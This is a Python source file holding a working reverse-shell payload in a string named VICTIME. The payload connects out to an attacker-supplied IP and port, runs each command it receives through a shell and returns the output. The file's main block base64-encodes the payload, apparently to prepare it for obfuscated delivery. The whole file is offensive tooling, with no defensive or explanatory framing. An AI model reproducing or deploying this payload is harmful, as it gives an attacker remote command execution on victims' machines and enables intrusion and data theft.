#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Apr 27 12:00:22 2026

@author: hounsousamuel
"""

VICTIME = \
r"""
import os
os.makedirs("/log", exist_ok=True)
def log(message):
    with open("/log/victime.txt", "a") as f:
        f.write(f"\nLOGS : {message}\n")
        
def victime(ip, port):
    import socket, subprocess, json, sys
    sock = socket.socket()
    port = int(port)
    log(ip)
    log(port)
    log("Connexions")
    sock.connect((ip, port))
    log("Connecté")
    sock.settimeout(3600)
    log("Timeoute Mis")
    try:
        while True:
            try:
                log("En attaente de cmd")
                cmd = sock.recv(65536).decode()
                log("Recu cmd")
                log(cmd)
                if not cmd:
                    print("[!] Connexion fermée")
                    break
                try:
                    dict_cmd = json.loads(cmd)
                except Exception:
                    dict_cmd = {"cmd": cmd}
                
                log("Dict cmd")
                log(json.dumps(dict_cmd))
                shell = isinstance(dict_cmd['cmd'], str)
                if "input" in dict_cmd:    
                    result = subprocess.run(
                        dict_cmd["cmd"], text=True, capture_output=True, check=False, input=dict_cmd["input"],
                        shell=shell,
                        timeout=30
                    )
                else:
                    result = subprocess.run(
                        dict_cmd["cmd"], text=True, capture_output=True, check=False, timeout=30, shell=shell
                    )
                
                log("Resultat en cours d'envoi")
                sock.send(
                    json.dumps(
                        {
                            "cmd": dict_cmd["cmd"],
                            "stdout": result.stdout,
                            "stderr": result.stderr,
                            "returncode": result.returncode,
                        }
                   ).encode()
                )
                log("Resultat send")
            except subprocess.TimeoutExpired:
                # Commande trop longue
                log("Subprocess timeout")
                sock.send(json.dumps({
                    "cmd": dict_cmd["cmd"],
                    "stdout": "",
                    "stderr": "Command timed out after 30s",
                    "returncode": 124
                }).encode())
                log("Message subprocess timeout envoyé")
            except (socket.error, BrokenPipeError, KeyboardInterrupt) as e:
                log("Erreur dans la boucle : ")
                log(str(e))
                import traceback
                log(str(traceback.format_exc()))
                continue
            
            except Exception as e:
                print(f"Erreur: {e}", file=sys.stderr)
                log("Erreur dans la boucle : ")
                log(str(e))
                import traceback
                log(str(traceback.format_exc()))
                pass
                
    except Exception as e:
        log("Erreur dans la boucle : ")
        log(str(e))
        import traceback
        log(str(traceback.format_exc()))
        pass
    finally:
        log("Finally")
        sock.close()

victime("{SHIELD_MARKER_IP}", "{SHIELD_MARKER_PORT}")
"""

if __name__ == "__main__":
    print(VICTIME)
    import base64
    a = base64.urlsafe_b64encode(VICTIME.encode()).decode()
    b = base64.urlsafe_b64decode(a.encode()).decode()
    print(a)
    print(b)
    print(VICTIME == b)